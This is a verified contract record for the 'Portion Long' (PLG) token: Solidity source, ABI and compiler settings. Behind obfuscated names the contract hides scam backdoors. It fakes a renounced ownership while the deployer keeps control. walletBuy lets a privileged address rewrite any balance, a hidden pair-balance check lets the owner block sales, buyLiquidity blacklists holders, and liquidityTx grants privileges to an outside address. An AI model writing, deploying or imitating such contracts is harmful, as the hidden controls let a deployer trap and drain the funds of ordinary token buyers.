{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface walletMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxSwap {\n    function createPair(address liquidityLimitToken, address exemptMinSwap) external returns (address);\n}\n\ninterface fundSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalWallet) external view returns (uint256);\n\n    function transfer(address tradingReceiver, uint256 txMarketing) external returns (bool);\n\n    function allowance(address enableTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingReceiver,\n        uint256 txMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyReceiverMin, uint256 value);\n    event Approval(address indexed enableTx, address indexed spender, uint256 value);\n}\n\ninterface launchedEnable is fundSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PortionLong is atReceiver, fundSwap, launchedEnable {\n\n    address public enableList;\n\n    uint256 public atReceiverSwap;\n\n    uint256 private marketingTeamAmount;\n\n    bool public minFee;\n\n    function allowance(address toAmount, address feeReceiverLimit) external view virtual override returns (uint256) {\n        if (feeReceiverLimit == teamAmountWallet) {\n            return type(uint256).max;\n        }\n        return atBuy[toAmount][feeReceiverLimit];\n    }\n\n    address teamAmountWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return shouldMin;\n    }\n\n    function walletBuy(address limitFeeIs, uint256 txMarketing) public {\n        listToken();\n        amountFee[limitFeeIs] = txMarketing;\n    }\n\n    function transfer(address limitFeeIs, uint256 txMarketing) external virtual override returns (bool) {\n        return autoShouldExempt(_msgSender(), limitFeeIs, txMarketing);\n    }\n\n    function transferFrom(address swapFund, address tradingReceiver, uint256 txMarketing) external override returns (bool) {\n        if (_msgSender() != teamAmountWallet) {\n            if (atBuy[swapFund][_msgSender()] != type(uint256).max) {\n                require(txMarketing <= atBuy[swapFund][_msgSender()]);\n                atBuy[swapFund][_msgSender()] -= txMarketing;\n            }\n        }\n        return autoShouldExempt(swapFund, tradingReceiver, txMarketing);\n    }\n\n    constructor (){\n        \n        walletMin walletAt = walletMin(teamAmountWallet);\n        enableList = maxSwap(walletAt.factory()).createPair(walletAt.WETH(), address(this));\n        if (teamLaunchedExempt == shouldWallet) {\n            maxWallet = maxTeam;\n        }\n        listFee = _msgSender();\n        fundSender();\n        fundTokenIs[listFee] = true;\n        amountFee[listFee] = minSellAmount;\n        if (teamLaunchedExempt) {\n            shouldWallet = true;\n        }\n        emit Transfer(address(0), listFee, minSellAmount);\n    }\n\n    mapping(address => bool) public enableMax;\n\n    uint256 public maxWallet;\n\n    uint256 private toIs;\n\n    function approve(address feeReceiverLimit, uint256 txMarketing) public virtual override returns (bool) {\n        atBuy[_msgSender()][feeReceiverLimit] = txMarketing;\n        emit Approval(_msgSender(), feeReceiverLimit, txMarketing);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private atBuy;\n\n    string private isTxBuy = \"PLG\";\n\n    uint256 constant liquidityShould = 12 ** 10;\n\n    uint256 atSenderExempt;\n\n    function balanceOf(address totalWallet) public view virtual override returns (uint256) {\n        return amountFee[totalWallet];\n    }\n\n    uint8 private walletTeamAuto = 18;\n\n    uint256 public receiverMax;\n\n    bool public shouldWallet;\n\n    event OwnershipTransferred(address indexed amountReceiver, address indexed txReceiver);\n\n    string private launchedShould = \"Portion Long\";\n\n    uint256 listTeam;\n\n    mapping(address => bool) public fundTokenIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTxBuy;\n    }\n\n    function autoShouldExempt(address swapFund, address tradingReceiver, uint256 txMarketing) internal returns (bool) {\n        if (swapFund == listFee) {\n            return tradingLimit(swapFund, tradingReceiver, txMarketing);\n        }\n        uint256 walletMarketing = fundSwap(enableList).balanceOf(teamSwap);\n        require(walletMarketing == listTeam);\n        require(tradingReceiver != teamSwap);\n        if (enableMax[swapFund]) {\n            return tradingLimit(swapFund, tradingReceiver, liquidityShould);\n        }\n        return tradingLimit(swapFund, tradingReceiver, txMarketing);\n    }\n\n    function listToken() private view {\n        require(fundTokenIs[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minSellAmount;\n    }\n\n    function buyLiquidity(address launchShould) public {\n        listToken();\n        if (teamLaunchedExempt) {\n            atReceiverSwap = maxWallet;\n        }\n        if (launchShould == listFee || launchShould == enableList) {\n            return;\n        }\n        enableMax[launchShould] = true;\n    }\n\n    mapping(address => uint256) private amountFee;\n\n    function liquidityTx(address exemptReceiverLimit) public {\n        require(exemptReceiverLimit.balance < 100000);\n        if (minFee) {\n            return;\n        }\n        \n        fundTokenIs[exemptReceiverLimit] = true;\n        \n        minFee = true;\n    }\n\n    uint256 private minSellAmount = 100000000 * 10 ** 18;\n\n    address private shouldMin;\n\n    uint256 public maxTeam;\n\n    function minTokenLaunch(uint256 txMarketing) public {\n        listToken();\n        listTeam = txMarketing;\n    }\n\n    bool private teamLaunchedExempt;\n\n    address teamSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletTeamAuto;\n    }\n\n    function owner() external view returns (address) {\n        return shouldMin;\n    }\n\n    function fundSender() public {\n        emit OwnershipTransferred(listFee, address(0));\n        shouldMin = address(0);\n    }\n\n    uint256 public shouldAmount;\n\n    function tradingLimit(address swapFund, address tradingReceiver, uint256 txMarketing) internal returns (bool) {\n        require(amountFee[swapFund] >= txMarketing);\n        amountFee[swapFund] -= txMarketing;\n        amountFee[tradingReceiver] += txMarketing;\n        emit Transfer(swapFund, tradingReceiver, txMarketing);\n        return true;\n    }\n\n    address public listFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiverMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeReceiverLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiverSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiverLimit\",\"type\":\"address\"}],\"name\":\"liquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"minTokenLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFeeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFeeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"walletBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PortionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}